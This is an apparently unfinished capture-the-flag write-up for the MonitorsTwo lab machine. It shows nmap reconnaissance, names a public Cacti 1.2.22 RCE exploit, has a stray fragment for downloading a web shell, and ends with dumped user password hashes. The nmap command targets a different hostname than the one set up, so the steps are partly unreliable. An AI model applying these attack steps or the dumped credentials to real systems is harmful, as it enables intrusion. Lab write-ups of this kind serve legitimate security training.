# Introduction

We first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.11.211 monitorstwo.htb
```

# Enumeration

We do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV vulnversity.thm
```

We got this result
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP (port 80)
We found a website that seems to use a webapp named Cacti in version 1.2.22
<img width="749" alt="image" src="https://github.com/MaTe0r/app.hackthebock.com/assets/94843357/72dd313b-88d7-46ed-8fe0-81a25260037d">

By googling, it seems there is no default credentials for the app but we found an RCE for the version 1.2.22 (https://www.exploit-db.com/exploits/51166)
curl -o shell.php


admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC (Jamie Thompson - admin@monitorstwo.htb)
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C (Marcus Brune - marcus@monitorstwo.htb)
guest:43e9a4ab75570f5b
